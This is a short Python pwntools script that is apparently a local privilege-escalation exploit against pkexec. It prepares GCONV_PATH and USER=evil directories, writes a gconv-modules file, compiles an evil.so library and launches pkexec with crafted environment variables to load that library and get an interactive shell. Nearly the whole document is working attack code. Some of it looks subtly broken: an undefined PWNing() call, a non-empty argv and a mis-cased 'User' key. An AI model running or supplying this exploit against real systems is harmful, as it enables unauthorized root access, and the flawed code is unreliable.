from pwn import *
import os

pkexec = '/usr/bin/pkexec'
gconv_path = 'GCONV_PATH=.'
program_dir = 'USER=evil'
evil = 'evil'
gconv_modules = '\'module\tINTERNAL\tevil//\tevil\t1\''


def prepare():
    # mkdir GCONV_PATH=. 
    os.system("mkdir -p " + gconv_path)
    # touch GCONV_PATH=./USER=evil
    os.system("touch " + gconv_path + "/" + program_dir)
    # mkdir USER=evil
    os.system("mkdir -p " + program_dir)
    # touch gconv-modules in USER=evil
    os.system("touch gconv-modules")
    os.system("echo " + gconv_modules + " > gconv-modules")
    # chmod 
    os.system("chmod 777 gconv-modules " + gconv_path + " " + program_dir)
    # compile evil.so
    os.system("gcc -w -shared -o evil.so -fPIC evil.c")
    # cp
    os.system("cp gconv-modules " + program_dir)
    os.system("cp evil.so " + program_dir)

def exp():
    prepare()
    argv = [pkexec]
    env = { 'User':evil,      # find USER=evil in PATH
            'PATH':gconv_path, # PATH
            'SHELL':evil,     # trigger iconv
            'CHARSET':evil    # iconv read it
            }
    io = process(argv=argv,env=env)
    io.interactive()

def main():
    PWNing()
    exp()

if __name__ == "__main__":
    main()